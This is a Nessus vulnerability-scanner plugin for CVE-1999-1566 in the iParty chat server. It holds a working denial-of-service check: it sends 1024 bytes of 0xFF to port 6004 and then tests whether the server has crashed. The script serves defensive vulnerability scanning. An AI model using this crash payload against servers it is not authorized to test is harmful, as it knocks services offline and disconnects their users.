#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10111);
 script_version("$Revision: 1.26 $");
 script_cvs_date("$Date: 2014/05/26 00:33:32 $");

 script_cve_id("CVE-1999-1566");
 script_bugtraq_id(6844);
 script_osvdb_id(12653);

 script_name(english:"iParty Client Extended Character Handling Remote Overflow DoS");
 script_summary(english:"Shuts down a iParty server");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is has a chat program installed that is affected by a
remote denial of service vulnerability.");
 script_set_attribute(attribute:"description", value:
"iParty is an audio/text chat program for Windows. The iParty server
listens on port 6004 for client requests. If someone connects to it
and sends a large amount of ASCII 255 chars, the server will close
itself and disconnect all the current users.");
 script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"vuln_publication_date", value:"1998/11/30");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/06/22");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 1999-2014 Tenable Network Security, Inc.");
 script_family(english:"Windows");

 script_require_keys("Settings/ParanoidReport");
 script_require_ports(6004);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if(get_port_state(6004))
{
 soc = open_sock_tcp(6004);
 if(soc)
 {
  asc = raw_string(0xFF);
  data = crap(data:asc, length:1024);
  send(socket:soc, data:data);
  close(soc);
  soc2 = open_sock_tcp(6004);
  if(!soc2)security_warning(6004);
  else close(soc2);
 }
}
